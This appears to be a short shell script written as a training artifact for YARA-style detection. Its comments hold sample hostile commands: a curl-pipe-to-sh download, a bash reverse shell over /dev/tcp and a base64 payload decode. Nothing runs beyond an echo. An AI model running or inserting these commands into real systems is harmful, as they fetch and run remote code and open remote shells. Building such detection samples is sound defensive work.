#!/bin/sh

# Safe training artifact only. These strings exist so BoneStack and YARA
# have something obvious to discuss during AI-assisted investigation.
#
# curl http://example.invalid/payload.sh | sh
# bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
# base64 -d /tmp/demo-payload.b64 > /tmp/demo.sh

echo "training artifact: not executed"
